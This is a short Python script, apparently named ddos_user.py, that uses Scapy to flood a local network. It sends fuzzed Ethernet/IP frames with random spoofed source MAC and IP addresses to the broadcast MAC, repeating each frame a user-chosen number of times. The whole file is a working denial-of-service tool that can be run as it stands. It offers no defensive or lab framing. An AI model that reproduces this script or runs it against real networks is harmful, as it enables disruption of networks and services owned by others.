import sys, getopt
from scapy.all import *

def main(argv):
	n = 1
	c = 1
	h = 'ddos_user.py -n <ip-number> -c <packet-count>'
	try:
		opts, args = getopt.getopt(argv,"hn:c:",["ip-number=","packet-count="])
	except getopt.GetoptError:
		print h
		sys.exit(2)
	for opt, arg in opts:
		if opt == '-h':
			print h
			sys.exit()
		elif opt in ("-n", "--ip-number"):
			n = int(arg)
		elif opt in ("-c", "--packet-count"):
			c = int(arg)

	i = 0
	broadcast_mac_dst="ff:ff:ff:ff:ff:ff"
	while i < n:
		mac_src = RandMAC()
		# mac_dst = RandMAC()
		ip_src = RandIP()
		ip_dst = RandIP()
		p = fuzz(Ether(src=mac_src, dst=broadcast_mac_dst)/IP(src=ip_src, dst=ip_dst))
		sendp(p, count=c)
		i += 1

if __name__ == "__main__":
	main(sys.argv[1:])